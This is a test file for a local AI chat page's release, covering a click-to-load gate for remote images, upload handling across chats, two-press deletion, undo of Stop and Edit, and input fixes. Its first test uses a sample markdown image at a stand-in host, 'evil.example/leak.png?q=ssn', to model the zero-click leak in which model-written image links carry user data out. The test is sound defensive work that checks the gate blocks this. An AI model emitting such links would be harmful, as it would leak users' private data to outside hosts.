/**
 * v1.322.0 — wave A of the assistant-ui / tambo borrow list: safety and
 * correctness in the chat page.
 *
 *  - A model-written image from the web waits for a press that names its host
 *    (a zero-click leak otherwise); this PC's own media still loads at once.
 *  - An upload that finishes after the user left the conversation is not
 *    attached to the next one, and a send queued behind it never fires there;
 *    one failed upload never costs the others.
 *  - Deleting a chat takes two presses.
 *  - Stop before the first word gives the question back; Edit and resend can
 *    be undone.
 *  - IME commits never send; reply actions show on touch; settledSplit is
 *    linear and returns what it always did.
 */

import { readFileSync } from "node:fs";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { act, cleanup, fireEvent, render, screen, waitFor, within } from "@testing-library/react";

const H = vi.hoisted(() => {
  class FakeApiError extends Error {
    status: number;
    constructor(message: string, status = 500) {
      super(message);
      this.status = status;
      this.name = "ApiError";
    }
  }
  class FakeStreamError extends FakeApiError {
    committed = false;
    offline = false;
    partial = "";
  }
  const stream = {
    bodies: [] as Record<string, unknown>[],
    replies: [] as string[],
    hold: false,
    streaming: false,
    version: 0,
    listeners: new Set<() => void>(),
    settle: null as null | ((r: Record<string, unknown>) => void),
    bump() {
      stream.version += 1;
      for (const l of [...stream.listeners]) l();
    },
  };
  return {
    FakeApiError,
    FakeStreamError,
    stream,
    api: {
      posts: [] as { path: string; body: Record<string, unknown> }[],
      puts: [] as { path: string; body: Record<string, unknown> }[],
      dels: [] as string[],
      getResponses: {} as Record<string, unknown>,
      postResponses: {} as Record<string, unknown>,
    },
  };
});

vi.mock("@/lib/api", () => ({
  ApiError: H.FakeApiError,
  API_BASE: "http://127.0.0.1:8787",
  ijToken: () => "",
  get: async (path: string) => {
    const r = H.api.getResponses[path];
    if (r === undefined) throw new H.FakeApiError(`unmocked GET ${path}`, 404);
    return r;
  },
  post: async (path: string, body: Record<string, unknown>) => {
    H.api.posts.push({ path, body });
    const r = H.api.postResponses[path];
    if (r instanceof Error) throw r;
    if (typeof r === "function") return (r as (b: Record<string, unknown>) => unknown)(body);
    return r ?? {};
  },
  put: async (path: string, body: Record<string, unknown>) => {
    H.api.puts.push({ path, body });
    const m = /^\/chat\/threads\/(.+)$/.exec(path);
    return { id: m && m[1] !== "new" ? m[1] : "t1", title: "t" };
  },
  del: async (path: string) => {
    H.api.dels.push(path);
    return {};
  },
}));

vi.mock("@/lib/useChatStream", async () => {
  const React = await import("react");
  const subscribe = (cb: () => void) => {
    H.stream.listeners.add(cb);
    return () => {
      H.stream.listeners.delete(cb);
    };
  };
  const run = async (body: Record<string, unknown>, onDelta: (d: string, f: string) => void) => {
    H.stream.bodies.push(body);
    H.stream.streaming = true;
    H.stream.bump();
    if (H.stream.hold) {
      return new Promise<Record<string, unknown>>((ok) => {
        H.stream.settle = ok;
      });
    }
    await new Promise<void>((r) => setTimeout(r, 0));
    const reply = H.stream.replies.shift() ?? "done";
    onDelta(reply, reply);
    H.stream.streaming = false;
    H.stream.bump();
    return { reply };
  };
  const abort = () => {
    const s = H.stream.settle;
    H.stream.settle = null;
    H.stream.streaming = false;
    H.stream.bump();
    s?.({ reply: "" });
  };
  return {
    StreamError: H.FakeStreamError,
    useLiveText: (s: { text?: string }) => s?.text ?? "",
    useChatStream: () => {
      React.useSyncExternalStore(subscribe, () => H.stream.version);
      return {
        streaming: H.stream.streaming,
        text: "",
        tools: [],
        approval: null,
        phase: H.stream.streaming ? "working" : null,
        run,
        abort,
      };
    },
  };
});
vi.mock("@/lib/useEvents", () => ({ useEvents: () => ({ events: [], connected: false }) }));
vi.mock("@/lib/useRunStream", () => ({
  useRunStream: () => ({ text: "", tools: [], phase: null, active: false, start: () => {}, stop: () => {} }),
}));
vi.mock("@/lib/useDictation", () => ({
  useDictation: () => ({
    supported: false, reason: null, engine: null, listening: false, processing: false,
    transcript: "", interim: "", error: null, start: () => {}, stop: () => {}, reset: () => {},
  }),
}));
vi.mock("@/lib/useTTS", () => ({
  useTTS: () => ({
    supported: false, enabled: false, speaking: false, enable: () => {}, disable: () => {},
    toggle: () => {}, speak: () => {}, resetStream: () => {}, speakMore: () => {}, cancel: () => {},
  }),
}));
vi.mock("@/lib/useProviderHealth", () => ({
  useProviderHealth: () => ({ byProvider: {}, defaultProvider: "", loading: false, stale: false, refresh: () => {} }),
}));
vi.mock("react-markdown", async () => await vi.importActual("react-markdown"));

import ChatPage from "@/app/chat/page";
import { Markdown, isTrustedMediaUrl } from "@/components/Markdown";
import { NEW_CHAT_EVENT } from "@/lib/sidebarSlot";
import { settledSplit } from "@/lib/streamSplit";

beforeEach(() => {
  H.api.posts.length = 0;
  H.api.puts.length = 0;
  H.api.dels.length = 0;
  H.stream.bodies.length = 0;
  H.stream.replies.length = 0;
  H.stream.hold = false;
  H.stream.streaming = false;
  H.stream.settle = null;
  for (const k of Object.keys(H.api.postResponses)) delete H.api.postResponses[k];
  H.api.getResponses = {
    "/models": { models: [] },
    "/chat/personas": { personas: [] },
    "/chat/threads": { threads: [] },
    "/settings": { settings: {} },
    "/projects": { projects: [] },
    "/agents/mentionable": { agents: [] },
    "/skills": { skills: [] },
    "/workflows": { workflows: [] },
    "/tools": { tools: [] },
    "/undo?session_id=chat": { actions: [] },
    "/chat/approvals/pending": { approvals: [] },
  };
  window.history.replaceState({}, "", "/chat");
  window.localStorage.clear();
  window.sessionStorage.clear();
  Element.prototype.scrollIntoView = vi.fn();
});
afterEach(() => {
  cleanup();
  vi.clearAllMocks();
});

async function send(text: string, reply: string) {
  const el = (await screen.findByPlaceholderText(/Message Iron Jarvis/)) as HTMLTextAreaElement;
  H.stream.replies.push(reply);
  fireEvent.change(el, { target: { value: text } });
  fireEvent.keyDown(el, { key: "Enter" });
  await screen.findByText(reply);
}

function attach(...names: string[]) {
  const input = document.querySelector('input[type="file"]') as HTMLInputElement;
  fireEvent.change(input, { target: { files: names.map((n) => new File(["abc"], n, { type: "application/pdf" })) } });
}

/** Uploads that settle only when the test says so. */
function heldUploads() {
  // No work folder here: the uploads attach exactly as they are.
  H.api.postResponses["/documents/workfolder"] = new H.FakeApiError("no folder", 503);
  const pending: { name: string; resolve: () => void; reject: (e: Error) => void }[] = [];
  H.api.postResponses["/documents/upload"] = (body: Record<string, unknown>) =>
    new Promise((resolve, reject) => {
      const name = String(body.filename);
      pending.push({
        name,
        resolve: () => resolve({ name, path: `C:/home/uploads/${name}` }),
        reject,
      });
    });
  return pending;
}

describe("remote images wait for a press (v1.322.0)", () => {
  it("a model-written web image is a button naming its host; nothing is fetched until it is pressed", () => {
    render(<Markdown content={"see ![chart](https://evil.example/leak.png?q=ssn)"} />);
    expect(document.querySelector("img")).toBeNull();
    const gate = screen.getByTestId("remote-media-gate");
    expect(gate.textContent).toContain("evil.example");
    fireEvent.click(gate);
    expect(document.querySelector("img")?.getAttribute("src")).toBe("https://evil.example/leak.png?q=ssn");
  });

  it("this PC's own media loads at once: a local path, an inline image, the daemon's origin", () => {
    expect(isTrustedMediaUrl("C:\\Users\\me\\pixio\\out.png")).toBe(true);
    expect(isTrustedMediaUrl("/creative/x.png")).toBe(true);
    expect(isTrustedMediaUrl("data:image/png;base64,AAAA")).toBe(true);
    expect(isTrustedMediaUrl("http://127.0.0.1:8787/creative/file-by-path?path=x")).toBe(true);
    expect(isTrustedMediaUrl("data:image/svg+xml;base64,AAAA")).toBe(false);
    expect(isTrustedMediaUrl("https://cdn.example/a.png")).toBe(false);
    expect(isTrustedMediaUrl("//evil.example/a.png")).toBe(false);
    render(<Markdown content={"![out](C:/Users/me/pixio/out.png)"} />);
    expect(document.querySelector("img")).not.toBeNull();
    expect(screen.queryByTestId("remote-media-gate")).toBeNull();
  });
});

describe("uploads belong to the conversation they started in (v1.322.0)", () => {
  it("a file that finishes uploading after New chat is not attached to the new chat, and a queued send never fires there", async () => {
    const held = heldUploads();
    render(<ChatPage />);
    const box = (await screen.findByPlaceholderText(/Message Iron Jarvis/)) as HTMLTextAreaElement;
    attach("return.pdf");
    await waitFor(() => expect(held).toHaveLength(1));
    // Enter while uploading queues the send behind the upload.
    fireEvent.change(box, { target: { value: "summarize it" } });
    fireEvent.keyDown(box, { key: "Enter" });
    await act(async () => {
      window.dispatchEvent(new Event(NEW_CHAT_EVENT));
    });
    // In the new chat the user starts typing — nothing they asked to send.
    fireEvent.change(box, { target: { value: "a new question, not sent" } });
    await act(async () => {
      held[0].resolve();
      await new Promise((r) => setTimeout(r, 20));
    });
    // Nothing on screen names the file (no chip, no folder note about it).
    expect(document.body.textContent ?? "").not.toContain("return.pdf");
    // No work folder is made for the conversation that was left.
    expect(H.api.posts.map((p) => p.path)).not.toContain("/documents/workfolder");
    expect(H.stream.bodies).toHaveLength(0);
    expect(box.value).toBe("a new question, not sent");
  });

  it("CONTROL: with no switch, the same held upload attaches and the queued send fires", async () => {
    const held = heldUploads();
    H.stream.replies.push("got it");
    render(<ChatPage />);
    const box = (await screen.findByPlaceholderText(/Message Iron Jarvis/)) as HTMLTextAreaElement;
    attach("return.pdf");
    await waitFor(() => expect(held).toHaveLength(1));
    fireEvent.change(box, { target: { value: "summarize it" } });
    fireEvent.keyDown(box, { key: "Enter" });
    await act(async () => {
      held[0].resolve();
      await new Promise((r) => setTimeout(r, 20));
    });
    await waitFor(() => expect(H.stream.bodies).toHaveLength(1));
    expect(JSON.stringify(H.stream.bodies[0])).toContain("return.pdf");
  });

  it("a switch while the work folder is still being made: the file still does not follow into the new chat", async () => {
    const held = heldUploads();
    let releaseFolder: () => void = () => {};
    H.api.postResponses["/documents/workfolder"] = () =>
      new Promise((_resolve, reject) => {
        releaseFolder = () => reject(new H.FakeApiError("no folder", 503));
      });
    render(<ChatPage />);
    await screen.findByPlaceholderText(/Message Iron Jarvis/);
    attach("return.pdf");
    await waitFor(() => expect(held).toHaveLength(1));
    await act(async () => {
      held[0].resolve();
      await new Promise((r) => setTimeout(r, 20));
    });
    // The upload is done and the folder request is out; now the user leaves.
    expect(H.api.posts.map((p) => p.path)).toContain("/documents/workfolder");
    await act(async () => {
      window.dispatchEvent(new Event(NEW_CHAT_EVENT));
    });
    await act(async () => {
      releaseFolder();
      await new Promise((r) => setTimeout(r, 20));
    });
    expect(document.body.textContent ?? "").not.toContain("return.pdf");
  });

  it("one failed upload never costs the others: the rest are attached and the failure is named", async () => {
    const held = heldUploads();
    render(<ChatPage />);
    await screen.findByPlaceholderText(/Message Iron Jarvis/);
    attach("a.pdf", "b.pdf");
    await waitFor(() => expect(held).toHaveLength(2));
    await act(async () => {
      held.find((h) => h.name === "a.pdf")!.resolve();
      held.find((h) => h.name === "b.pdf")!.reject(new H.FakeApiError("disk full", 507));
      await new Promise((r) => setTimeout(r, 20));
    });
    expect(await screen.findByText("a.pdf")).toBeTruthy();
    expect(screen.getByText(/Couldn't attach b\.pdf: disk full/)).toBeTruthy();
  });
});

describe("deleting a chat takes two presses (v1.322.0)", () => {
  it("the first press arms it and says so; only the second deletes", async () => {
    H.api.getResponses["/chat/threads"] = {
      threads: [{ id: "t1", title: "Client K-1", updated_at: "2026-10-08T10:00:00", messages: [] }],
    };
    render(<ChatPage />);
    fireEvent.click(await screen.findByLabelText("Options for Client K-1"));
    const del = await screen.findByRole("menuitem", { name: /Delete chat/ });
    fireEvent.click(del);
    expect(H.api.dels).toEqual([]);
    expect(del.textContent).toContain("Delete for good? Press again");
    fireEvent.click(del);
    await waitFor(() => expect(H.api.dels).toContain("/chat/threads/t1"));
  });
});

describe("Stop and Edit give work back (v1.322.0)", () => {
  it("Stop before the first word keeps 'Stopped.' and puts the question back in the box", async () => {
    H.stream.hold = true;
    render(<ChatPage />);
    const box = (await screen.findByPlaceholderText(/Message Iron Jarvis/)) as HTMLTextAreaElement;
    fireEvent.change(box, { target: { value: "wrong question" } });
    fireEvent.keyDown(box, { key: "Enter" });
    fireEvent.click(await screen.findByTitle("Stop this turn"));
    expect(await screen.findByText("Stopped.")).toBeTruthy();
    await waitFor(() => expect(box.value).toBe("wrong question"));
  });

  it("Edit and resend can be undone: the removed replies come back, and the box gets back what it held", async () => {
    render(<ChatPage />);
    await send("first question", "first answer");
    await send("second question", "second answer");
    const box = (await screen.findByPlaceholderText(/Message Iron Jarvis/)) as HTMLTextAreaElement;
    fireEvent.change(box, { target: { value: "half typed" } });
    fireEvent.click(screen.getAllByLabelText("Edit and resend")[0]);
    await waitFor(() => expect(screen.queryByText("second answer")).toBeNull());
    fireEvent.click(within(screen.getByTestId("edit-undo")).getByRole("button", { name: "Undo" }));
    expect(await screen.findByText("second answer")).toBeTruthy();
    expect(box.value).toBe("half typed");
    expect(screen.queryByTestId("edit-undo")).toBeNull();
    const saved = H.api.puts.filter((p) => p.path.startsWith("/chat/threads/")).at(-1)!;
    expect((saved.body.messages as { content: string }[]).map((m) => m.content)).toEqual([
      "first question",
      "first answer",
      "second question",
      "second answer",
    ]);
  });
});

describe("small fixes (v1.322.0)", () => {
  it("an IME commit (keyCode 229) never sends", async () => {
    render(<ChatPage />);
    const box = (await screen.findByPlaceholderText(/Message Iron Jarvis/)) as HTMLTextAreaElement;
    fireEvent.change(box, { target: { value: "こんにちは" } });
    fireEvent.keyDown(box, { key: "Enter", keyCode: 229 });
    await act(async () => {
      await new Promise((r) => setTimeout(r, 10));
    });
    expect(H.stream.bodies).toHaveLength(0);
  });

  it("reply actions are visible on a touch screen (no hover there)", () => {
    const src = readFileSync(join(__dirname, "..", "app", "chat", "page.tsx"), "utf-8");
    expect((src.match(/group-hover\/msg:opacity-100 \[@media\(hover:none\)\]:opacity-100/g) ?? []).length).toBe(2);
  });

  it("settledSplit is unchanged in what it returns, and linear", () => {
    function old(content: string): number {
      let fence = false;
      let lastBlank = 0;
      let pos = 0;
      const lines = content.split("\n");
      for (let i = 0; i < lines.length; i += 1) {
        const line = lines[i];
        if (/^\s*(```|~~~)/.test(line)) fence = !fence;
        if (!fence && line.trim() === "" && i > 0) {
          const rest = lines.slice(i + 1).join("\n");
          if (rest.trim() !== "") lastBlank = pos + line.length + 1;
        }
        pos += line.length + 1;
      }
      return lastBlank;
    }
    const parts = ["para one", "", "  ", "```", "code", "", "```", "- item", "", "tail", "~~~", "x", ""];
    let seed = 7;
    for (let n = 0; n < 400; n += 1) {
      const lines: string[] = [];
      for (let k = 0; k < 12; k += 1) {
        seed = (seed * 1103515245 + 12345) % 2147483648;
        lines.push(parts[seed % parts.length]);
      }
      const text = lines.join("\n");
      expect(settledSplit(text)).toBe(old(text));
    }
  });
});

describe("a Windows media path survives the markdown URL filter (v1.322.0)", () => {
  it("an image at C:/… renders through the daemon's media route; a C: link stays filtered", () => {
    render(<Markdown content={"![out](C:/Users/me/pixio/out.png) and [x](C:/secret.txt)"} />);
    const img = document.querySelector("img");
    expect(img?.getAttribute("src") ?? "").toContain("/creative/file-by-path?path=");
    expect(screen.queryByTestId("remote-media-gate")).toBeNull();
    expect(document.querySelector('a[href^="C:"]')).toBeNull();
  });
});
